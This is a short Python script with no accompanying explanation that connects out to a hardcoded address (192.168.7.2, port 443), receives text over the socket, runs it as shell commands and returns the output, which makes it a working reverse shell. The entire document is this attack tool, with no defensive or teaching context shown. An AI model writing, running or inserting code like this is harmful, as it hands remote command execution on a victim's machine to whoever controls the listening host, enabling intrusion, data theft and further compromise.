import socket,subprocess,os
H = '192.168.7.2'
P = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((H,P))
while 1:
    data = s.recv(1024)
    if data == 'exit' or data == 'Exit': break
    proc = subprocess.Popen(data[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_val = proc.stdout.read() + proc.stderr.read()
    s.send(stdout_val)
s.close()
